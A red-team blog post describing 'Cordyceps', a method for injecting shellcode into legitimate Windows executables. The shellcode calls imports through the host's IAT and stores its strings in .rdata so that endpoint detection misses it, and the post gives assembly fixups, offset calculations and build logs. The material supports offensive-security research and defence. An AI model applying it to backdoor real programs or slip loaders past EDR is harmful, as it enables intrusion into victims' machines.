# https://blog.deeb.ch/posts/exe-injection/

# Cordyceps: Shellcode in EXE Injection

Stealthy shellcode injection into executables to bypass EDR.

## Intro

One of the most important things as a RedTeamer is to get Initial Access (IA), aka
Remote-Code-Execution (RCE) on a host, typically a Windows Client.
A common technique is to send some malicious files to a victim, which when clicked,
will execute our payload.

There are many different file types used for this, like ISO, MSI, JS, LNK, VBA…

But I want to focus on EXE (and DLL) files.

This is part of a three-article series:

- See [Supermega](https://blog.deeb.ch/posts/supermega) for an introduction on how to use the SuperMega loader laboratory
- See [How EDR works](https://blog.deeb.ch/posts/how-edr-works) for a discussion of EDR detection principles
- [Cordyceps EXE Injection](https://blog.deeb.ch/posts/exe-injection) for a discussion of Cordyceps approaches (this)

I published the source code at [github.com/dobin/SuperMega](https://github.com/dobin/SuperMega).

## About this technique

The idea is to integrate shellcode more deeply into existing
exe’s. It will take all the goodness of the victim exe, and
hopefully allow the loader (carrier & payload)
to stay under the radar.

The carrier also resides in an IMAGE section, which makes
it more trustworthy.

This can be compared to DLL-Stomping or Process-Hollowing.

## Backdooring EXE’s Advantages

Injecting shellcode into an EXE has a few advantages. It keeps most
of the original data intact:

- No PEB walk, including API hashing or similar
- Original Imports / IAT
- Code similarity analysis defeated (Machine learning based detection)
  - No need for good-code stuffing
- Loader execution in an IMAGE memory region
  - no call stack spoofing is required
  - origin of threads are IMAGE

## Shellcode Injection into PE

Shellcode on Windows cannot directly call syscalls, but has to use
`ntdll.dll` mapped in each process. This requires a technique that I
call peb\_walk to resolve the function addresses by the DLL- and function names.
A typical writeup is [Finding Kernel32 Base and Function Addresses in Shellcode](https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode).
It usually involves parsing the process PEB, and then invoking `GetProcAddress()`.

From the perspective of a loader-shellcode, querying the API of our peb\_walk
resolver could look somewhat like this:

```c
	LPVOID base = get_module_by_name((const LPWSTR)"kernel32.dll");
	LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA";
	LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");

	HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName)
      = (HMODULE(WINAPI*)(LPCSTR)) load_lib;
	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
      = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

	int (WINAPI * _GetEnvironmentVariableW)(
		_In_opt_ LPCWSTR lpName,
		_Out_opt_ LPWSTR  lpBuffer,
		_In_ DWORD nSize) = (int (WINAPI*)(
			_In_opt_ LPCWSTR lpName,
			_Out_opt_ LPWSTR  lpBuffer,
			_In_opt_ LPCWSTR,
			_In_ DWORD nSize)) _GetProcAddress((HMODULE)base, "GetEnvironmentVariableW");
   ...
```

The code queries for the address of all the exported DLL functions it requires.
The details of how peb\_walk works exactly is not important here, but it requires
a not insubstantial amount of code.

But, when we inject shellcode into an EXE, what stops us from calling the DLL functions
directly, like the normal code of the executable? Like in the following trivial
example `call &MessageBoxW`:
![Messagebox in original code](https://blog.deeb.ch/exeinjection/messagebox-call-original.png)

And it turns out, nothing stops us from doing this ourselves.

## Cordyceps - shellcode fixups to re-use IAT

All the EXE’s required DLLs and functions are specified in the IAT (Import Address Table) in the
PE header. It is a list of DLL names, each having a list of function
names to import. The code does not know at which address the DLL function it
wants to call is located, so it will just jump to a static location in the IAT.
If the DLL function is not yet resolved, the IAT entry will point to the
DLL resolver, and write the DLL function’s address in its address instead.

The nice thing is: That the jump from the .text section to the IAT is a relative
jump (Debuggers and disassemblers “hide” this fact). It is not affected by ASLR, as all PE sections are loaded and randomized
as one blob. Therefore we can fixup our injected shellcode so it reuses
the IAT, instead of doing a peb\_walk.

### IAT call example

In the following example, the `call` at address `0x140001017` will jump to the IAT address
stored at `0x140002080` (which is `0x7FF82168AEE0`, the address of the `MessageBoxW()` function in ntdll.dll, but we also don’t care
about that).

![Messagebox in original code](https://blog.deeb.ch/exeinjection/messagebox-call-original-details.png)

![Messagebox IAT info](https://blog.deeb.ch/exeinjection/messagebox-call-iat.png)

The `MessageBoxW` IAT entry is at `0x2080`.

The offset, as seen by the little-endian `call` encoding, is `0x1063`.
The relative offset is `0x140002080 - 0x140001017 - 6 = 0x1063`
(note that RIP will point to the next instruction to be executed, so we have to
adjust the offset by the length of the `call` instruction, which is 6).
Debuggers and disassemblers usually hide this low-level stuff.

### Cordyceps: IAT Fixup step by step

So, we can create this jump by ourselves by patching the shellcode injected
in the EXE. I call this the Cordyceps technique.

The issue is that masm assembler cannot create this jump. It has neither
its current memory address for a relative jump nor a valid jump target
to resolve later. So instead, i patch the assembly source code, replacing
the old jump with a placeholder of random bytes. Then in the resulting EXE,
patch the placeholder with the correct relative jump.

Let’s have an example and call `VirtualAlloc()` via the IAT from our shellcode.

The C source:

```c
	char *dest = VirtualAlloc(NULL, 433, 0x3000, p_RW);
```

The ASM text code generated by `cl.exe` from the C source code:

```asm
	mov	r9d, 4
	mov	r8d, 12288				; 00003000H
	mov	edx, 433				; 000001b1H
	xor	ecx, ecx
	call	QWORD PTR __imp_VirtualAlloc
```

Note that `__imp_VirtualAlloc` points to an external symbol,
which would be resolved when linking the ASM source. Let’s remove it
with a placeholder of random bytes, in this case `c5 db d7 0a ec af`:

```asm
	mov	r9d, 4
	mov	r8d, 12288				; 00003000H
	mov	edx, 433				; 000001b1H
	xor	ecx, ecx
	DB 0c5H, 0dbH, 0d7H, 00aH, 0ecH, 0afH ; IAT Reuse for VirtualAlloc
```

After injecting the shellcode into the target EXE, replace the placeholder
bytes with a newly constructed call to the correct IAT entry:

```
ff 15 f3 dd 0a 00      call	qword ptr [rip + 0xaddf3]
```

Lets get the offset from the assembly instruction: `ff 15 f3 dd 0a 00` where `ff 15` is the call instruction,
and `f3 dd 0a 00` is the offset in little endian, converted: `00 0a dd f3` = 0x0addf3.

Log message when building:

```c
(injector.py ) Replace c5dbd70aecaf at VA 0x14006FB5F with: call to IAT at VA 0x14011D958 (VirtualAlloc)
(asmdisasm.py) 	  [00000000]	ff 15 f3 dd 0a 00      call	qword ptr [rip + 0xaddf3]
```

The relative jump offset was calculated like this:

```
  relative_offset = dest_iat_function_rva - current_instruction_rva - 6
                  = 0x14011D958 - 0x14006FB5F - 6 = 0x0ADDF3
```

Result:

- No more peb\_walk (no `LoadLibrary()`, no `GetProcAddress()` etc.) signatures
- No telemetry for peb\_walk generated

## .rdata data reference: The Problem

Shellcode must contain the data it needs for its function calls embedded
in its code. This can look highly suspicious.

One option is to encode the data as push instructions, which create the
strings on the stack at runtime, and then reference it with the stack pointer
RSP. This can be forced to be generated by using the following trick:

```
	wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
```

This will make the assembler creating the following code:

```
	mov	eax, 107				; 0000006bH k
	mov	WORD PTR kernel32_dll_name$[rsp], ax
	mov	eax, 101				; 00000065H e
	mov	WORD PTR kernel32_dll_name$[rsp+2], ax
	mov	eax, 114				; 00000072H r
	mov	WORD PTR kernel32_dll_name$[rsp+4], ax
	mov	eax, 110				; 0000006eH n
	mov	WORD PTR kernel32_dll_name$[rsp+6], ax
	mov	eax, 101				; 00000065H e
	mov	WORD PTR kernel32_dll_name$[rsp+8], ax
	mov	eax, 108				; 0000006cH l
	mov	WORD PTR kernel32_dll_name$[rsp+10], ax
	mov	eax, 51					; 00000033H 3
	mov	WORD PTR kernel32_dll_name$[rsp+12], ax
	mov	eax, 50					; 00000032H 2
	mov	WORD PTR kernel32_dll_name$[rsp+14], ax
	mov	eax, 46					; 0000002eH .
	mov	WORD PTR kernel32_dll_name$[rsp+16], ax
	mov	eax, 100				; 00000064H d
	mov	WORD PTR kernel32_dll_name$[rsp+18], ax
	mov	eax, 108				; 0000006cH l
	mov	WORD PTR kernel32_dll_name$[rsp+20], ax
	mov	eax, 108				; 0000006cH l
	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
	xor	eax, eax        ; \x00
	mov	WORD PTR kernel32_dll_name$[rsp+24], ax

	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
```

Or alternatively, use a different technique that stores the strings
inline in the .text section as bytes, and jumps over it:

```masm
	lea	rax, QWORD PTR msg_content$[rsp]

	CALL after_$SG72694
$SG72694 DB	'Hello World!', 00H
after_$SG72694:

	POP  rcx
```

## .rdata data reference: Solution

What stops us from putting our data into another section, let’s say
`.rdata`, and replacing references? All sections, including `.rdata`, are ASLR’d together.
So, a relative LEA from `.text` to `.rdata` is possible (and usual).

A string reference in C:

```c
	wchar_t envVarName[] = L"USERPROFILE";
```

When compiled into text ASM, it will look like this:

```
$SG72731 DB	'U', 00H, 'S', 00H, 'E', 00H, 'R', 00H, 'P', 00H, 'R', 00H
         DB	'O', 00H, 'F', 00H, 'I', 00H, 'L', 00H, 'E', 00H, 00H, 00H

...

	lea	rcx, OFFSET FLAT:$SG72731
	mov	rdi, rax
	mov	rsi, rcx
	mov	ecx, 24
	rep movsb
```

Remove the $SG\* data from the assembly. And then replace the `LEA` with a random bytes
placeholder:

```
	DB 094H, 041H, 00aH, 029H, 0f3H, 03bH, 018H ; .rdata Reuse for $SG72731 (rcx)
	mov	rdi, rax
	mov	rsi, rcx
	mov	ecx, 24
	rep movsb
```

And patch the shellcode in the binary, after it got injected: replace
`0x94 0x41 0x0a 0x29 0xf3 0x3b 0x18` with `lea <reg>, <current-address relative offset>`.

Patched carrier shellcode in injected binary:
![x64dbg disassembly of the lea rdata reuse](https://blog.deeb.ch/exeinjection/rdata-reference.png)

![x64dbg list of sections including .rdata](https://blog.deeb.ch/exeinjection/rdata-reference-sections.png)

Log of adding the string into `.rdata`:

```
(injector.py     )      Handling DataReuse Fixup: $SG72731 <- 94410a29f33b18
(injector.py     )        Add to .rdata at 0x14011EAA9 (1174185): $SG72731: USERPROFILE
```

Log of patching the LEA referencing the above data:

```
(injector.py     )        Replace bytes 94410a29f33b18 at VA 0x14008E73E with: LEA rcx .rdata 0x14011EAA9
(asmdisasm.py    ) 	    [14008e73e]	48 8d 0d 64 03 09 00   lea	rcx, [rip + 0x90364]
```

## Summary

So what is Cordyceps? Nothing else than injecting Shellcode into
an EXE file, and then making it call functions via IAT, and reference
data in .rdata - exactly like a normal EXE without injected shellcode.

This makes it hard for an EDR to detect something malicious, which would
trigger it to perform more detailed analysis or scans.

All calls coming from the carrier originate from an IMAGE memory region.
No DLL resolving with a PEB-walk needed, generating less telemetry.